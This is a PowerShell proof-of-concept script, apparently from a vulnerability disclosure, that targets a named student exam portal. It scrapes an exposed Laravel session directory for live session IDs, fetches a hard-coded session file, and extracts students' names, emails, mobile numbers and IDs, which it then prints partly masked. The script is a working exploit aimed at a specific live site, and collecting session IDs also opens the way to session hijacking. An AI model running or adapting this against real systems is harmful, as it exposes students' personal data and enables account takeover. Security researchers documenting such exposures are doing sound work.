# PoC 03 — Unauthenticated Live Session File Access (Masked Edition)
# Finding: CRITICAL | ID: SES-01
# Target: https://student.citexams.in/storage/framework/sessions/
# Run: powershell -ExecutionPolicy Bypass -File .\poc_03_session_exposure.ps1

Write-Host "=========================================="
Write-Host " PoC 03 — Student Session File Exposure" -ForegroundColor Cyan
Write-Host " Target: /storage/framework/sessions/"
Write-Host "=========================================="
Write-Host ""

$baseUrl     = "https://student.citexams.in/storage/framework/sessions/"
$demoSession = "zyWKQ0PjOy7mllIWYnPgkHqz2gsqfHOBsgdRKCNu"

Write-Host "[*] Auditing Session Storage Directory..."
try {
    $dir     = Invoke-WebRequest -Uri $baseUrl -UseBasicParsing -ErrorAction Stop
    $sessIds = [regex]::Matches($dir.Content, 'href="([a-zA-Z0-9]{40})"') | ForEach-Object { $_.Groups[1].Value }

    Write-Host "[!] HTTP $($dir.StatusCode) OK — Directory Indexing Enabled" -ForegroundColor Red
    Write-Host "[!] Active Session Files Found: $($sessIds.Count)" -ForegroundColor Red
    Write-Host ""

    Write-Host "[*] Fetching Sample Session File (ID: $demoSession)..."
    $raw     = Invoke-WebRequest -Uri "$baseUrl$demoSession" -UseBasicParsing -ErrorAction Stop
    $content = $raw.Content

    if ($content -match "^[\d\s]+$") {
        $bytes   = $content.Trim() -split '\s+' | ForEach-Object { [byte]$_ }
        $content = [System.Text.Encoding]::ASCII.GetString($bytes)
    }

    # Mask extracted values
    $name   = [regex]::Match($content, '"student_name";s:\d+:"([^"]+)"').Groups[1].Value
    $email  = [regex]::Match($content, '"email";s:\d+:"([^"]+)"').Groups[1].Value
    $mobile = [regex]::Match($content, '"mobile_no";s:\d+:"([^"]+)"').Groups[1].Value
    $stuId  = [regex]::Match($content, '"student_id";i:(\d+)').Groups[1].Value
    $branch = [regex]::Match($content, '"branch_name";s:\d+:"([^"]+)"').Groups[1].Value
    $class  = [regex]::Match($content, '"class_name";s:\d+:"([^"]+)"').Groups[1].Value

    $maskedName   = if ($name.Length -gt 3) { $name.Substring(0, 3) + "***" } else { "***" }
    $maskedEmail  = if ($email -match "(.{2}).*(@.*)") { $Matches[1] + "***" + $Matches[2] } else { "***" }
    $maskedMobile = if ($mobile.Length -eq 10) { $mobile.Substring(0, 4) + "****" + $mobile.Substring(8) } else { "***" }

    Write-Host ""
    Write-Host "=== Extracted Student Record (Masked) ===" -ForegroundColor Yellow
    Write-Host "  Name         : $maskedName"
    Write-Host "  Email        : $maskedEmail"
    Write-Host "  Mobile       : $maskedMobile"
    Write-Host "  Student ID   : $stuId"
    Write-Host "  Branch       : $branch"
    Write-Host "  Semester     : $class"
    Write-Host ""

    Write-Host "[CONFIRMED] Active student session PII is publicly accessible." -ForegroundColor Red

} catch {
    $code = $_.Exception.Response.StatusCode.value__
    Write-Host "[SAFE] HTTP $code — Directory is protected." -ForegroundColor Green
}
